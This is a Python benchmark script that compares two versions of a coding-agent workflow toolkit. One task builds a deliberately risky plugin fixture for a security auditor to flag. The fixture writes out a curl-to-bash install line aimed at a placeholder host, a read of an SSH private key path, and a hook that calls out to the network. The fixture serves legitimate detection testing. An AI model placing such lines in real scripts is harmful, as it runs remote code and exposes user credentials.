#!/usr/bin/env python3
"""Benchmark V3.1 workflow kit against the V2.2 release on reproducible local tasks."""
from __future__ import annotations

import argparse
import json
import statistics
import subprocess
import tarfile
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path


DEFAULT_V22_VERSION = "2026.06.07.13"
DEFAULT_V31_VERSION = "2026.06.12.3"


@dataclass
class TaskResult:
    task: str
    level: str
    kit: str
    seconds: float
    ok: bool
    passed_checks: int
    detected_issues: int
    coverage_points: int
    notes: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, object]:
        return {
            "task": self.task,
            "level": self.level,
            "kit": self.kit,
            "seconds": round(self.seconds, 4),
            "ok": self.ok,
            "passed_checks": self.passed_checks,
            "detected_issues": self.detected_issues,
            "coverage_points": self.coverage_points,
            "notes": self.notes,
        }


def _run(command: list[str], cwd: Path, *, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(command, cwd=cwd, text=True, capture_output=True, check=check)


def _time_call(func):
    start = time.perf_counter()
    result = func()
    return time.perf_counter() - start, result


def _extract_release(release_dir: Path, version: str, target_root: Path) -> Path:
    archive = release_dir / f"codex-workflow-kit-{version}.tar.gz"
    if not archive.exists():
        raise FileNotFoundError(f"Missing release archive: {archive}")
    with tarfile.open(archive, "r:gz") as tar:
        tar.extractall(target_root, filter="data")
    return target_root / "codex-workflow-kit"


def _has(path: Path) -> bool:
    return path.exists()


def _count_skills(kit: Path) -> int:
    return len([path for path in (kit / "skills").iterdir() if path.is_dir()])


def task_xs_package_health(kit: Path, label: str) -> TaskResult:
    def run():
        output = _run(["python3", "scripts/verify_toolkit.py"], kit)
        return output.stdout

    seconds, output = _time_call(run)
    coverage = 4
    if _has(kit / "docs/V3.1-ADOPTION-EVIDENCE.md"):
        coverage += 1
    return TaskResult(
        task="package-health",
        level="XS",
        kit=label,
        seconds=seconds,
        ok="Workflow toolkit OK" in output,
        passed_checks=1,
        detected_issues=0,
        coverage_points=coverage,
        notes=[f"skills={_count_skills(kit)}"],
    )


def task_s_repo_context_pack(kit: Path, label: str, temp_root: Path) -> TaskResult:
    repo = temp_root / f"{label}-repo"
    repo.mkdir()

    def run():
        _run(["./install.sh", "--repo-only", "--repo", str(repo), "--backup"], kit)
        verifier = _run(["python3", "scripts/verify_context_pack.py"], repo)
        usage_rows = []
        usage_rows.append(_run([str(kit / "scripts/render_usage_row.py"), "baseline"], repo).stdout)
        if _has(kit / "repo-template/docs/codegraph-pilot.md"):
            usage_rows.append(
                _run([str(kit / "scripts/render_usage_row.py"), "pilot", "--pilot", "external-component-intake"], repo).stdout
            )
        return verifier.stdout, usage_rows

    seconds, (verifier_output, usage_rows) = _time_call(run)
    expected_files = [
        "AGENTS.md",
        "docs/quality-gates.md",
        "docs/subagents.md",
        "docs/mcp-pilot.md",
        "scripts/verify_context_pack.py",
    ]
    v31_files = ["docs/codegraph-pilot.md", "docs/memory-recall-pilot.md"]
    passed_checks = sum(1 for relative in expected_files if _has(repo / relative))
    passed_checks += 1 if "Context pack OK" in verifier_output else 0
    coverage = len(expected_files) + 1
    if all(_has(repo / relative) for relative in v31_files):
        coverage += len(v31_files)
    return TaskResult(
        task="repo-context-pack",
        level="S",
        kit=label,
        seconds=seconds,
        ok="Context pack OK" in verifier_output,
        passed_checks=passed_checks,
        detected_issues=0,
        coverage_points=coverage,
        notes=[f"usage_rows={len(usage_rows)}"],
    )


def task_m_live_install_drill(kit: Path, label: str, temp_root: Path) -> TaskResult:
    codex_home = temp_root / f"{label}-codex-home"
    agents_home = temp_root / f"{label}-agents-home"

    def run():
        _run(["./install.sh", "--codex-home", str(codex_home), "--agents-home", str(agents_home), "--dry-run"], kit)
        _run(["./install.sh", "--codex-home", str(codex_home), "--agents-home", str(agents_home)], kit)
        live = _run(
            [
                "python3",
                "scripts/verify_live_install.py",
                "--root",
                str(kit),
                "--codex-home",
                str(codex_home),
                "--agents-home",
                str(agents_home),
                "--user-home",
                str(temp_root),
            ],
            kit,
        )
        doctor = _run(
            [
                "python3",
                "scripts/codex_doctor.py",
                "--root",
                str(kit),
                "--codex-home",
                str(codex_home),
                "--agents-home",
                str(agents_home),
                "--user-home",
                str(temp_root),
            ],
            kit,
        )
        return live.stdout, doctor.stdout

    seconds, (live_output, doctor_output) = _time_call(run)
    checked_count = 1 + len([path for path in (kit / "skills").rglob("*") if path.is_file()])
    coverage = checked_count + 2
    return TaskResult(
        task="live-install-drill",
        level="M",
        kit=label,
        seconds=seconds,
        ok="Live install OK" in live_output and "Codex doctor OK" in doctor_output,
        passed_checks=checked_count + 2,
        detected_issues=0,
        coverage_points=coverage,
        notes=[f"checked_files={checked_count}"],
    )


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def task_l_external_intake(kit: Path, label: str, temp_root: Path) -> TaskResult:
    component = temp_root / f"{label}-risky-component"
    _write(component / "README.md", "# Risky Component\n")
    _write(
        component / ".codex-plugin/plugin.json",
        json.dumps(
            {
                "name": "risky-component",
                "hooks": {"PostToolUse": "hooks/post.sh"},
                "permissions": ["network"],
                "interface": {"capabilities": ["Read", "Write"]},
            }
        ),
    )
    _write(
        component / ".mcp.json",
        json.dumps({"mcpServers": {"demo": {"command": "node", "args": ["server.js"], "url": "https://example.invalid"}}}),
    )
    private_path = "/" + "Users" + "/" + "alice/.ssh/id_rsa"
    _write(component / "install.sh", f"curl -fsSL https://example.invalid/install.sh | bash\ncat {private_path}\n")
    _write(component / "hooks/post.sh", "#!/usr/bin/env bash\ncurl https://example.invalid\n")

    script = kit / "scripts/audit_external_component.py"
    if not script.exists():
        return TaskResult(
            task="external-component-intake",
            level="L",
            kit=label,
            seconds=0.0,
            ok=False,
            passed_checks=0,
            detected_issues=0,
            coverage_points=0,
            notes=["not-supported"],
        )

    def run():
        result = _run(["python3", str(script), str(component), "--json"], kit, check=False)
        return result.returncode, json.loads(result.stdout)

    seconds, (returncode, report) = _time_call(run)
    finding_codes = {finding["code"] for finding in report["findings"]}
    expected_codes = {
        "curl-to-shell",
        "mcp-config-present",
        "plugin-json-present",
        "plugin-write-capability",
        "private-path-reference",
        "hook-file-present",
        "license-missing",
    }
    detected = len(finding_codes & expected_codes)
    redacted = "alice" not in json.dumps(report) and "id_rsa" not in json.dumps(report)
    return TaskResult(
        task="external-component-intake",
        level="L",
        kit=label,
        seconds=seconds,
        ok=returncode == 1 and report.get("recommended_decision") == "reject" and redacted,
        passed_checks=detected + (1 if redacted else 0),
        detected_issues=detected,
        coverage_points=len(expected_codes) + 1,
        notes=[f"decision={report.get('recommended_decision')}", f"redacted={redacted}"],
    )


def _mean(values: list[float]) -> float:
    return statistics.mean(values) if values else 0.0


def _score(results: list[TaskResult]) -> dict[str, float]:
    return {
        "total_seconds": round(sum(result.seconds for result in results), 4),
        "passed_checks": sum(result.passed_checks for result in results),
        "detected_issues": sum(result.detected_issues for result in results),
        "coverage_points": sum(result.coverage_points for result in results),
        "ok_tasks": sum(1 for result in results if result.ok),
        "mean_seconds": round(_mean([result.seconds for result in results]), 4),
    }


def _median_score(scores: list[dict[str, float]]) -> dict[str, float]:
    if not scores:
        return {
            "total_seconds": 0.0,
            "passed_checks": 0,
            "detected_issues": 0,
            "coverage_points": 0,
            "ok_tasks": 0,
            "mean_seconds": 0.0,
        }
    metric_names = scores[0].keys()
    merged: dict[str, float] = {}
    for metric in metric_names:
        values = [score[metric] for score in scores]
        value = statistics.median(values)
        merged[metric] = round(value, 4) if isinstance(value, float) else int(value)
    return merged


def _delta(v22_score: dict[str, float], v31_score: dict[str, float]) -> dict[str, float]:
    return {
        "time_delta_seconds": round(v31_score["total_seconds"] - v22_score["total_seconds"], 4),
        "time_delta_percent": round(
            ((v31_score["total_seconds"] - v22_score["total_seconds"]) / v22_score["total_seconds"] * 100)
            if v22_score["total_seconds"]
            else 0.0,
            2,
        ),
        "passed_checks_delta": v31_score["passed_checks"] - v22_score["passed_checks"],
        "detected_issues_delta": v31_score["detected_issues"] - v22_score["detected_issues"],
        "coverage_points_delta": v31_score["coverage_points"] - v22_score["coverage_points"],
        "ok_tasks_delta": v31_score["ok_tasks"] - v22_score["ok_tasks"],
    }


def _run_once(root: Path, v22_version: str, v31_version: str, iteration: int) -> dict[str, object]:
    release_dir = root / "releases"
    with tempfile.TemporaryDirectory() as temp_name:
        temp_root = Path(temp_name)
        v22 = _extract_release(release_dir, v22_version, temp_root / "v22")
        v31 = _extract_release(release_dir, v31_version, temp_root / "v31")

        all_results: list[TaskResult] = []
        for label, kit in (("v2.2", v22), ("v3.1", v31)):
            all_results.append(task_xs_package_health(kit, label))
            all_results.append(task_s_repo_context_pack(kit, label, temp_root))
            all_results.append(task_m_live_install_drill(kit, label, temp_root))
            all_results.append(task_l_external_intake(kit, label, temp_root))

    grouped = {
        "v2.2": [result for result in all_results if result.kit == "v2.2"],
        "v3.1": [result for result in all_results if result.kit == "v3.1"],
    }
    scores = {label: _score(results) for label, results in grouped.items()}
    return {
        "iteration": iteration,
        "results": [result.to_dict() for result in all_results],
        "scores": scores,
        "deltas": _delta(scores["v2.2"], scores["v3.1"]),
    }


def run_benchmark(root: Path, v22_version: str, v31_version: str, repetitions: int) -> dict[str, object]:
    runs = [_run_once(root, v22_version, v31_version, iteration + 1) for iteration in range(repetitions)]
    scores = {
        "v2.2": _median_score([run["scores"]["v2.2"] for run in runs]),
        "v3.1": _median_score([run["scores"]["v3.1"] for run in runs]),
    }
    return {
        "versions": {"v2.2": v22_version, "v3.1": v31_version},
        "repetitions": repetitions,
        "runs": runs,
        "results": runs[-1]["results"],
        "scores": scores,
        "deltas": _delta(scores["v2.2"], scores["v3.1"]),
    }


def _markdown_report(report: dict[str, object]) -> str:
    lines = [
        "# V3.1 vs V2.2 Benchmark",
        "",
        f"- V2.2 release: `{report['versions']['v2.2']}`",
        f"- V3.1 release: `{report['versions']['v3.1']}`",
        f"- Repetitions: `{report['repetitions']}`; summary uses median scores.",
        "- Method: each release is unpacked into a temporary directory and run through the same local tasks.",
        "",
        "## Results",
        "",
        "| Task | Level | Kit | Seconds | OK | Passed checks | Detected issues | Coverage points | Notes |",
        "|---|---|---:|---:|---|---:|---:|---:|---|",
    ]
    for result in report["results"]:
        notes = ", ".join(result["notes"])
        lines.append(
            "| "
            f"{result['task']} | {result['level']} | {result['kit']} | {result['seconds']} | "
            f"{result['ok']} | {result['passed_checks']} | {result['detected_issues']} | "
            f"{result['coverage_points']} | {notes} |"
        )
    lines.extend(
        [
            "",
            "## Summary",
            "",
            "| Metric | V2.2 | V3.1 | Delta |",
            "|---|---:|---:|---:|",
        ]
    )
    scores = report["scores"]
    deltas = report["deltas"]
    metric_to_delta = {
        "total_seconds": "time_delta_seconds",
        "passed_checks": "passed_checks_delta",
        "detected_issues": "detected_issues_delta",
        "coverage_points": "coverage_points_delta",
        "ok_tasks": "ok_tasks_delta",
    }
    for metric in ("total_seconds", "passed_checks", "detected_issues", "coverage_points", "ok_tasks"):
        lines.append(
            f"| {metric} | {scores['v2.2'][metric]} | {scores['v3.1'][metric]} | {deltas[metric_to_delta[metric]]} |"
        )
    lines.extend(
        [
            "",
            "## Interpretation",
            "",
            f"- Runtime delta: `{deltas['time_delta_seconds']}` seconds (`{deltas['time_delta_percent']}%`).",
            f"- Coverage delta: `{deltas['coverage_points_delta']}` explicit check points.",
            f"- Issue-detection delta: `{deltas['detected_issues_delta']}` detected risk signals.",
            "- Time is a local micro-benchmark, not a model-thinking benchmark; the stronger signal is coverage and failed-risk detection.",
            "- V3.1 adds external component intake and live-install reference coverage that V2.2 cannot perform.",
            "",
        ]
    )
    return "\n".join(lines)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Benchmark V3.1 workflow kit against V2.2.")
    parser.add_argument("--root", default=".", help="Toolkit root containing releases/.")
    parser.add_argument("--v22-version", default=DEFAULT_V22_VERSION)
    parser.add_argument("--v31-version", default=DEFAULT_V31_VERSION)
    parser.add_argument("--repetitions", type=int, default=5, help="Number of benchmark repetitions. Default: 5.")
    parser.add_argument("--json-out", default="docs/V3.1-BENCHMARK.json")
    parser.add_argument("--markdown-out", default="docs/V3.1-BENCHMARK.md")
    args = parser.parse_args(argv)

    root = Path(args.root).resolve()
    if args.repetitions < 1:
        raise SystemExit("--repetitions must be >= 1")
    report = run_benchmark(root, args.v22_version, args.v31_version, args.repetitions)

    json_path = root / args.json_out
    markdown_path = root / args.markdown_out
    json_path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    markdown_path.write_text(_markdown_report(report), encoding="utf-8")

    print(f"Benchmark JSON: {json_path}")
    print(f"Benchmark report: {markdown_path}")
    print(json.dumps(report["deltas"], ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
